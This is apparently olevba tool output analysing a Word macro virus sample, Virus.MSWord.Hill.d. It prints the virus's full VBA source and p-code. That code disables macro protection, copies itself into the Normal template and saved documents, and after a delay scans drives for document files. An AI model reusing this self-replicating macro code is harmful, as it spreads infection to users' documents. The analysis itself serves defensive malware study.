olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hill.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hill.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Модуль1.bas 
in file: Virus.MSWord.Hill.d - OLE stream: 'Macros/VBA/Модуль1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Dim k As String, f As String
Private Declare Function FindFirstFile Lib "kernel32" _
Alias "FindFirstFileA" _
(ByVal lpFileName As String, _
lpFindFileData As WIN32_FIND_DATA) As Long
Private Declare Function FindNextFile Lib "kernel32" _
Alias "FindNextFileA" _
(ByVal hFindFile As Long, _
lpFindFileData As WIN32_FIND_DATA) As Long
Private Declare Function GetFileAttributes Lib "kernel32" _
Alias "GetFileAttributesA" _
(ByVal lpFileName As String) As Long
Private Declare Function FindClose Lib "kernel32" _
(ByVal hFindFile As Long) As Long
Const MAX_PATH = 260
Const MAXDWORD = &HFFFF
Const INVALID_HANDLE_VALUE = -1
Const FILE_ATTRIBUTE_ARCHIVE = &H20
Const FILE_ATTRIBUTE_DIRECTORY = &H10
Const FILE_ATTRIBUTE_HIDDEN = &H2
Const FILE_ATTRIBUTE_NORMAL = &H80
Const FILE_ATTRIBUTE_READONLY = &H1
Const FILE_ATTRIBUTE_SYSTEM = &H4
Const FILE_ATTRIBUTE_TEMPORARY = &H100
Private Type FILETIME
dwLowDateTime As Long
dwHighDateTime As Long
End Type
Private Type WIN32_FIND_DATA
dwFileAttributes As Long
ftCreationTime As FILETIME
ftLastAccessTime As FILETIME
ftLastWriteTime As FILETIME
nFileSizeHigh As Long
nFileSizeLow As Long
dwReserved0 As Long
dwReserved1 As Long
cFileName As String * MAX_PATH
cAlternate As String * 14
End Type
Private Function StripNulls(OriginalStr As String) As String
If (InStr(OriginalStr, Chr(0)) > 0) Then
OriginalStr = Left(OriginalStr, _
InStr(OriginalStr, Chr(0)) - 1)
End If
StripNulls = OriginalStr
End Function
Private Function FindFilesAPI(path As String, _
SearchStr As String, _
FileCount As Integer, _
DirCount As Integer)
On Error Resume Next
Dim FileName As String
Dim DirName As String
Dim dirNames() As String
Dim nDir As Integer
Dim i As Integer
Dim hSearch As Long
Dim WFD As WIN32_FIND_DATA
Dim Cont As Integer
If Right(path, 1) <> "\" Then path = path & "\"
nDir = 0
ReDim dirNames(nDir)
Cont = True
hSearch = FindFirstFile(path & "*", WFD)
If hSearch <> INVALID_HANDLE_VALUE Then
Do While Cont
DirName = StripNulls(WFD.cFileName)
If (DirName <> ".") And (DirName <> "..") Then
If GetFileAttributes(path & DirName) And _
                           FILE_ATTRIBUTE_DIRECTORY Then
dirNames(nDir) = DirName
DirCount = DirCount + 1
nDir = nDir + 1
ReDim Preserve dirNames(nDir)
End If
End If
Cont = FindNextFile(hSearch, WFD)
Loop
Cont = FindClose(hSearch)
End If
hSearch = FindFirstFile(path & SearchStr, WFD)
Cont = True
If hSearch <> INVALID_HANDLE_VALUE Then
While Cont
FileName = StripNulls(WFD.cFileName)
If (FileName <> ".") And (FileName <> "..") Then
FindFilesAPI = FindFilesAPI + _
(WFD.nFileSizeHigh * MAXDWORD) + _
WFD.nFileSizeLow
FileCount = FileCount + 1
On Error Resume Next
DoEvents
Dim r1 As String
r1 = Right(FileName, 3)
If r1 = "xls" Or r1 = "txt" Or r1 = "rtf" Or r1 = "doc" Or r1 = "rar" Or r1 = "zip" Or r1 = "dwg" Or r1 = "jpg" Or r1 = "bak" Or r1 = "dbf" Or r1 = "mdb" Or r1 = "bas" _
Or r1 = "XLS" Or r1 = "TXT" Or r1 = "RTF" Or r1 = "DOC" Or r1 = "RAR" Or r1 = "ZIP" Or r1 = "DWG" Or r1 = "JPG" Or r1 = "BAK" Or r1 = "DBF" Or r1 = "MDB" Or r1 = "BAS" Then
On Error Resume Next
Debug.Print path & FileName
' Open path & FileName For Output As #1
' Print #1, " "
' Close #1
End If
End If
Cont = FindNextFile(hSearch, WFD)
Wend
Cont = FindClose(hSearch)
End If
If nDir > 0 Then
For i = 0 To nDir - 1
FindFilesAPI = FindFilesAPI + _
FindFilesAPI(path & dirNames(i) _
& "\", SearchStr, FileCount, DirCount)
Next i
End If
End Function
 Sub AutoOpen()
Dim ad, nt
On Error Resume Next
Options.VirusProtection = False
Options.SaveInterval = 2
ad = ActiveDocument.Name
nt = NormalTemplate.FullName
If NormalTemplate.VBProject.VBComponents.Item("Модуль1").Name = " " Then
k = FreeFile
MakeFile
End If
If NormalTemplate.VBProject.VBComponents.Item("Модуль1").Name <> "Модуль1" Then
Application.OrganizerCopy Source:=ad, Destination:=nt, Name:="Модуль1", Object:=wdOrganizerObjectProjectItems
End If
NormalTemplate.Save
DooIt
End Sub
Sub FileSave()
On Error Resume Next
If ActiveDocument.VBProject.VBComponents.Item("Модуль1").Name <> "Модуль1" Then
NormalTemplate.VBProject.VBComponents("Модуль1").Export "C:\Winlog.log"
ActiveDocument.VBProject.VBComponents.import "C:\Winlog.log"
Kill "C:\Winlog.log"
End If
ActiveDocument.Save
f = GetSetting("FuckSoft", "MyDay", "MyTime")
If f = "" Then
MakeFile
End If
DooIt
End Sub
Sub ViewVBCode()
End Sub
Sub ToolsMacro()
End Sub
Sub DooIt()
Options.SaveInterval = 2
On Error Resume Next
Dim d1 As Date, d, d2 As Date, t As String
d1 = Format(Now, "short date")
t = GetSetting("FuckSoft", "MyDay", "MyTime")
d2 = CDate(t): d = d1 - d2
Dim NumFiles As Integer, NumDirs As Integer, FileSize As Long
If 10 < d Then
FileSize = FindFilesAPI("C:\", "*.*", NumFiles, NumDirs)
FileSize = FindFilesAPI("D:\", "*.*", NumFiles, NumDirs)
End If
End Sub
Sub MakeFile()
Dim t As Date
t = Format(Now, "short date")
t = CStr(t)
SaveSetting "FuckSoft", "MyDay", "MyTime", t
End Sub
Sub Autoexit()
FileSave
End Sub
Sub Autoexec()
FileSave
End Sub
Sub Autonew()
FileSave
End Sub
Sub Openshell()
FileSave
End Sub
Sub AutoClose()
FileSave
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Hill.d
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Модуль1 - 11066 bytes
' Line #0:
' 	Option  (Explicit)
' Line #1:
' 	Dim 
' 	VarDefn k (As String)
' 	VarDefn False (As String)
' Line #2:
' 	LineCont 0x000C 06 00 00 00 08 00 00 00 0E 00 00 00
' 	FuncDefn (Private Declare Function FindFirstFile Lib "kernel32" (ByVal lpFileName As String, lpFindFileData As ) As Long)
' Line #3:
' 	LineCont 0x000C 06 00 00 00 08 00 00 00 0E 00 00 00
' 	FuncDefn (Private Declare Function FindNextFile Lib "kernel32" (ByVal hFindFile As Long, lpFindFileData As ) As Long)
' Line #4:
' 	LineCont 0x0008 06 00 00 00 08 00 00 00
' 	FuncDefn (Private Declare Function GetFileAttributes Lib "kernel32" (ByVal lpFileName As String) As Long)
' Line #5:
' 	LineCont 0x0004 06 00 00 00
' 	FuncDefn (Private Declare Function FindClose Lib "kernel32" (ByVal hFindFile As Long) As Long)
' Line #6:
' 	Dim (Const) 
' 	LitDI2 0x0104 
' 	VarDefn MAX_PATH
' Line #7:
' 	Dim (Const) 
' 	LitHI2 0xFFFF 
' 	VarDefn MAXDWORD
' Line #8:
' 	Dim (Const) 
' 	LitDI2 0x0001 
' 	UMi 
' 	VarDefn INVALID_HANDLE_VALUE
' Line #9:
' 	Dim (Const) 
' 	LitHI2 0x0020 
' 	VarDefn FILE_ATTRIBUTE_ARCHIVE
' Line #10:
' 	Dim (Const) 
' 	LitHI2 0x0010 
' 	VarDefn FILE_ATTRIBUTE_DIRECTORY
' Line #11:
' 	Dim (Const) 
' 	LitHI2 0x0002 
' 	VarDefn FILE_ATTRIBUTE_HIDDEN
' Line #12:
' 	Dim (Const) 
' 	LitHI2 0x0080 
' 	VarDefn FILE_ATTRIBUTE_NORMAL
' Line #13:
' 	Dim (Const) 
' 	LitHI2 0x0001 
' 	VarDefn FILE_ATTRIBUTE_READONLY
' Line #14:
' 	Dim (Const) 
' 	LitHI2 0x0004 
' 	VarDefn FILE_ATTRIBUTE_SYSTEM
' Line #15:
' 	Dim (Const) 
' 	LitHI2 0x0100 
' 	VarDefn FILE_ATTRIBUTE_TEMPORARY
' Line #16:
' 	Type (Private) FILETIME
' Line #17:
' 	DimImplicit 
' 	VarDefn dwLowDateTime (As Long)
' Line #18:
' 	DimImplicit 
' 	VarDefn dwHighDateTime (As Long)
' Line #19:
' 	EndType 
' Line #20:
' 	Type (Private) WIN32_FIND_DATA
' Line #21:
' 	DimImplicit 
' 	VarDefn dwFileAttributes (As Long)
' Line #22:
' 	DimImplicit 
' 	VarDefn ftCreationTime (As FILETIME)
' Line #23:
' 	DimImplicit 
' 	VarDefn ftLastAccessTime (As FILETIME)
' Line #24:
' 	DimImplicit 
' 	VarDefn ftLastWriteTime (As FILETIME)
' Line #25:
' 	DimImplicit 
' 	VarDefn nFileSizeHigh (As Long)
' Line #26:
' 	DimImplicit 
' 	VarDefn nFileSizeLow (As Long)
' Line #27:
' 	DimImplicit 
' 	VarDefn dwReserved0 (As Long)
' Line #28:
' 	DimImplicit 
' 	VarDefn dwReserved1 (As Long)
' Line #29:
' 	DimImplicit 
' 	Ld MAX_PATH 
' 	VarDefn cFileName
' Line #30:
' 	DimImplicit 
' 	LitDI2 0x000E 
' 	VarDefn cAlternate
' Line #31:
' 	EndType 
' Line #32:
' 	FuncDefn (Private Function StripNulls(OriginalStr As String) As String)
' Line #33:
' 	Ld OriginalStr 
' 	LitDI2 0x0000 
' 	ArgsLd Chr 0x0001 
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #34:
' 	LineCont 0x0004 06 00 00 00
' 	Ld OriginalStr 
' 	Ld OriginalStr 
' 	LitDI2 0x0000 
' 	ArgsLd Chr 0x0001 
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	St OriginalStr 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	Ld OriginalStr 
' 	St StripNulls 
' Line #37:
' 	EndFunc 
' Line #38:
' 	LineCont 0x000C 08 00 00 00 0C 00 00 00 10 00 00 00
' 	FuncDefn (Private Function FindFilesAPI(path As String, SearchStr As String, FileCount As Integer, DirCount As Integer))
' Line #39:
' 	OnError (Resume Next) 
' Line #40:
' 	Dim 
' 	VarDefn FileName (As String)
' Line #41:
' 	Dim 
' 	VarDefn DirName (As String)
' Line #42:
' 	Dim 
' 	VarDefn dirNames (As String)
' Line #43:
' 	Dim 
' 	VarDefn nDir (As Integer)
' Line #44:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #45:
' 	Dim 
' 	VarDefn hSearch (As Long)
' Line #46:
' 	Dim 
' 	VarDefn WFD
' Line #47:
' 	Dim 
' 	VarDefn Cont (As Integer)
' Line #48:
' 	Ld path 
' 	LitDI2 0x0001 
' 	ArgsLd Right 0x0002 
' 	LitStr 0x0001 "\"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld path 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St path 
' 	EndIf 
' Line #49:
' 	LitDI2 0x0000 
' 	St nDir 
' Line #50:
' 	OptionBase 
' 	Ld nDir 
' 	Redim dirNames 0x0001 (As Variant)
' Line #51:
' 	LitVarSpecial (True)
' 	St Cont 
' Line #52:
' 	Ld path 
' 	LitStr 0x0001 "*"
' 	Concat 
' 	Ld WFD 
' 	ArgsLd FindFirstFile 0x0002 
' 	St hSearch 
' Line #53:
' 	Ld hSearch 
' 	Ld INVALID_HANDLE_VALUE 
' 	Ne 
' 	IfBlock 
' Line #54:
' 	Ld Cont 
' 	DoWhile 
' Line #55:
' 	Ld WFD 
' 	MemLd cFileName 
' 	ArgsLd StripNulls 0x0001 
' 	St DirName 
' Line #56:
' 	Ld DirName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld DirName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #57:
' 	LineCont 0x0004 08 00 1B 00
' 	Ld path 
' 	Ld DirName 
' 	Concat 
' 	ArgsLd GetFileAttributes 0x0001 
' 	Ld FILE_ATTRIBUTE_DIRECTORY 
' 	And 
' 	IfBlock 
' Line #58:
' 	Ld DirName 
' 	Ld nDir 
' 	ArgsSt dirNames 0x0001 
' Line #59:
' 	Ld DirCount 
' 	LitDI2 0x0001 
' 	Add 
' 	St DirCount 
' Line #60:
' 	Ld nDir 
' 	LitDI2 0x0001 
' 	Add 
' 	St nDir 
' Line #61:
' 	OptionBase 
' 	Ld nDir 
' 	Redim (Preserve) dirNames 0x0001 (As Variant)
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	Ld hSearch 
' 	Ld WFD 
' 	ArgsLd FindNextFile 0x0002 
' 	St Cont 
' Line #65:
' 	Loop 
' Line #66:
' 	Ld hSearch 
' 	ArgsLd FindClose 0x0001 
' 	St Cont 
' Line #67:
' 	EndIfBlock 
' Line #68:
' 	Ld path 
' 	Ld SearchStr 
' 	Concat 
' 	Ld WFD 
' 	ArgsLd FindFirstFile 0x0002 
' 	St hSearch 
' Line #69:
' 	LitVarSpecial (True)
' 	St Cont 
' Line #70:
' 	Ld hSearch 
' 	Ld INVALID_HANDLE_VALUE 
' 	Ne 
' 	IfBlock 
' Line #71:
' 	Ld Cont 
' 	While 
' Line #72:
' 	Ld WFD 
' 	MemLd cFileName 
' 	ArgsLd StripNulls 0x0001 
' 	St FileName 
' Line #73:
' 	Ld FileName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld FileName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #74:
' 	LineCont 0x0008 04 00 00 00 0C 00 00 00
' 	Ld FindFilesAPI 
' 	Ld WFD 
' 	MemLd nFileSizeHigh 
' 	Ld MAXDWORD 
' 	Mul 
' 	Paren 
' 	Add 
' 	Ld WFD 
' 	MemLd nFileSizeLow 
' 	Add 
' 	St FindFilesAPI 
' Line #75:
' 	Ld FileCount 
' 	LitDI2 0x0001 
' 	Add 
' 	St FileCount 
' Line #76:
' 	OnError (Resume Next) 
' Line #77:
' 	ArgsCall DoEvents 0x0000 
' Line #78:
' 	Dim 
' 	VarDefn r1 (As String)
' Line #79:
' 	Ld FileName 
' 	LitDI2 0x0003 
' 	ArgsLd Right 0x0002 
' 	St r1 
' Line #80:
' 	LineCont 0x0004 30 00 00 00
' 	Ld r1 
' 	LitStr 0x0003 "xls"
' 	Eq 
' 	Ld r1 
' 	LitStr 0x0003 "txt"
' 	Eq 
' 	Or 
' 	Ld r1 
' 	LitStr 0x0003 "rtf"
' 	Eq 
' 	Or 
' 	Ld r1 
' 	LitStr 0x0003 "doc"
' 	Eq 
' 	Or 
' 	Ld r1 
' 	LitStr 0x0003 "rar"
' 	Eq 
' 	Or 
' 	Ld r1 
' 	LitStr 0x0003 "zip"
' 	Eq 
' 	Or 
' 	Ld r1 
' 	LitStr 0x0003 "dwg"
' 	Eq 
' 	Or 
' 	Ld r1 
' 	LitStr 0x0003 "jpg"
' 	Eq 
' 	Or 
' 	Ld r1 
' 	LitStr 0x0003 "bak"
' 	Eq 
' 	Or 
' 	Ld r1 
' 	LitStr 0x0003 "dbf"
' 	Eq 
' 	Or 
' 	Ld r1 
' 	LitStr 0x0003 "mdb"
' 	Eq 
' 	Or 
' 	Ld r1 
' 	LitStr 0x0003 "bas"
' 	Eq 
' 	Or 
' 	Ld r1 
' 	LitStr 0x0003 "XLS"
' 	Eq 
' 	Or 
' 	Ld r1 
' 	LitStr 0x0003 "TXT"
' 	Eq 
' 	Or 
' 	Ld r1 
' 	LitStr 0x0003 "RTF"
' 	Eq 
' 	Or 
' 	Ld r1 
' 	LitStr 0x0003 "DOC"
' 	Eq 
' 	Or 
' 	Ld r1 
' 	LitStr 0x0003 "RAR"
' 	Eq 
' 	Or 
' 	Ld r1 
' 	LitStr 0x0003 "ZIP"
' 	Eq 
' 	Or 
' 	Ld r1 
' 	LitStr 0x0003 "DWG"
' 	Eq 
' 	Or 
' 	Ld r1 
' 	LitStr 0x0003 "JPG"
' 	Eq 
' 	Or 
' 	Ld r1 
' 	LitStr 0x0003 "BAK"
' 	Eq 
' 	Or 
' 	Ld r1 
' 	LitStr 0x0003 "DBF"
' 	Eq 
' 	Or 
' 	Ld r1 
' 	LitStr 0x0003 "MDB"
' 	Eq 
' 	Or 
' 	Ld r1 
' 	LitStr 0x0003 "BAS"
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #81:
' 	OnError (Resume Next) 
' Line #82:
' 	Debug 
' 	PrintObj 
' 	Ld path 
' 	Ld FileName 
' 	Concat 
' 	PrintItemNL 
' Line #83:
' 	QuoteRem 0x0000 0x0026 " Open path & FileName For Output As #1"
' Line #84:
' 	QuoteRem 0x0000 0x000E " Print #1, " ""
' Line #85:
' 	QuoteRem 0x0000 0x0009 " Close #1"
' Line #86:
' 	EndIfBlock 
' Line #87:
' 	EndIfBlock 
' Line #88:
' 	Ld hSearch 
' 	Ld WFD 
' 	ArgsLd FindNextFile 0x0002 
' 	St Cont 
' Line #89:
' 	Wend 
' Line #90:
' 	Ld hSearch 
' 	ArgsLd FindClose 0x0001 
' 	St Cont 
' Line #91:
' 	EndIfBlock 
' Line #92:
' 	Ld nDir 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #93:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld nDir 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #94:
' 	LineCont 0x0008 04 00 00 00 0C 00 00 00
' 	Ld FindFilesAPI 
' 	Ld path 
' 	Ld i 
' 	ArgsLd dirNames 0x0001 
' 	Concat 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld SearchStr 
' 	Ld FileCount 
' 	Ld DirCount 
' 	ArgsLd FindFilesAPI 0x0004 
' 	Add 
' 	St FindFilesAPI 
' Line #95:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #96:
' 	EndIfBlock 
' Line #97:
' 	EndFunc 
' Line #98:
' 	FuncDefn (Sub AutoOpen())
' Line #99:
' 	Dim 
' 	VarDefn ad
' 	VarDefn nt
' Line #100:
' 	OnError (Resume Next) 
' Line #101:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #102:
' 	LitDI2 0x0002 
' 	Ld Options 
' 	MemSt SaveInterval 
' Line #103:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	St ad 
' Line #104:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	St nt 
' Line #105:
' 	LitStr 0x0007 "Модуль1"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0001 " "
' 	Eq 
' 	IfBlock 
' Line #106:
' 	Ld Friend 
' 	St k 
' Line #107:
' 	ArgsCall MakeFile 0x0000 
' Line #108:
' 	EndIfBlock 
' Line #109:
' 	LitStr 0x0007 "Модуль1"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "Модуль1"
' 	Ne 
' 	IfBlock 
' Line #110:
' 	Ld ad 
' 	ParamNamed Source 
' 	Ld nt 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "Модуль1"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #111:
' 	EndIfBlock 
' Line #112:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #113:
' 	ArgsCall DooIt 0x0000 
' Line #114:
' 	EndSub 
' Line #115:
' 	FuncDefn (Sub FileSave())
' Line #116:
' 	OnError (Resume Next) 
' Line #117:
' 	LitStr 0x0007 "Модуль1"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "Модуль1"
' 	Ne 
' 	IfBlock 
' Line #118:
' 	LitStr 0x000D "C:\Winlog.log"
' 	LitStr 0x0007 "Модуль1"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #119:
' 	LitStr 0x000D "C:\Winlog.log"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #120:
' 	LitStr 0x000D "C:\Winlog.log"
' 	ArgsCall Kill 0x0001 
' Line #121:
' 	EndIfBlock 
' Line #122:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #123:
' 	LitStr 0x0008 "FuckSoft"
' 	LitStr 0x0005 "MyDay"
' 	LitStr 0x0006 "MyTime"
' 	ArgsLd GetSetting 0x0003 
' 	St False 
' Line #124:
' 	Ld False 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #125:
' 	ArgsCall MakeFile 0x0000 
' Line #126:
' 	EndIfBlock 
' Line #127:
' 	ArgsCall DooIt 0x0000 
' Line #128:
' 	EndSub 
' Line #129:
' 	FuncDefn (Sub ViewVBCode())
' Line #130:
' 	EndSub 
' Line #131:
' 	FuncDefn (Sub ToolsMacro())
' Line #132:
' 	EndSub 
' Line #133:
' 	FuncDefn (Sub DooIt())
' Line #134:
' 	LitDI2 0x0002 
' 	Ld Options 
' 	MemSt SaveInterval 
' Line #135:
' 	OnError (Resume Next) 
' Line #136:
' 	Dim 
' 	VarDefn d1 (As Date)
' 	VarDefn d
' 	VarDefn d2 (As Date)
' 	VarDefn t (As String)
' Line #137:
' 	Ld Now 
' 	LitStr 0x000A "short date"
' 	ArgsLd Format$ 0x0002 
' 	St d1 
' Line #138:
' 	LitStr 0x0008 "FuckSoft"
' 	LitStr 0x0005 "MyDay"
' 	LitStr 0x0006 "MyTime"
' 	ArgsLd GetSetting 0x0003 
' 	St t 
' Line #139:
' 	Ld t 
' 	Coerce (Date) 
' 	St d2 
' 	BoS 0x0000 
' 	Ld d1 
' 	Ld d2 
' 	Sub 
' 	St d 
' Line #140:
' 	Dim 
' 	VarDefn NumFiles (As Integer)
' 	VarDefn NumDirs (As Integer)
' 	VarDefn FileSize (As Long)
' Line #141:
' 	LitDI2 0x000A 
' 	Ld d 
' 	Lt 
' 	IfBlock 
' Line #142:
' 	LitStr 0x0003 "C:\"
' 	LitStr 0x0003 "*.*"
' 	Ld NumFiles 
' 	Ld NumDirs 
' 	ArgsLd FindFilesAPI 0x0004 
' 	St FileSize 
' Line #143:
' 	LitStr 0x0003 "D:\"
' 	LitStr 0x0003 "*.*"
' 	Ld NumFiles 
' 	Ld NumDirs 
' 	ArgsLd FindFilesAPI 0x0004 
' 	St FileSize 
' Line #144:
' 	EndIfBlock 
' Line #145:
' 	EndSub 
' Line #146:
' 	FuncDefn (Sub MakeFile())
' Line #147:
' 	Dim 
' 	VarDefn t (As Date)
' Line #148:
' 	Ld Now 
' 	LitStr 0x000A "short date"
' 	ArgsLd Format$ 0x0002 
' 	St t 
' Line #149:
' 	Ld t 
' 	Coerce (Str) 
' 	St t 
' Line #150:
' 	LitStr 0x0008 "FuckSoft"
' 	LitStr 0x0005 "MyDay"
' 	LitStr 0x0006 "MyTime"
' 	Ld t 
' 	ArgsCall SaveSetting 0x0004 
' Line #151:
' 	EndSub 
' Line #152:
' 	FuncDefn (Sub Autoexit())
' Line #153:
' 	ArgsCall FileSave 0x0000 
' Line #154:
' 	EndSub 
' Line #155:
' 	FuncDefn (Sub Autoexec())
' Line #156:
' 	ArgsCall FileSave 0x0000 
' Line #157:
' 	EndSub 
' Line #158:
' 	FuncDefn (Sub Autonew())
' Line #159:
' 	ArgsCall FileSave 0x0000 
' Line #160:
' 	EndSub 
' Line #161:
' 	FuncDefn (Sub Openshell())
' Line #162:
' 	ArgsCall FileSave 0x0000 
' Line #163:
' 	EndSub 
' Line #164:
' 	FuncDefn (Sub AutoClose())
' Line #165:
' 	ArgsCall FileSave 0x0000 
' Line #166:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Autoexit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Autonew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

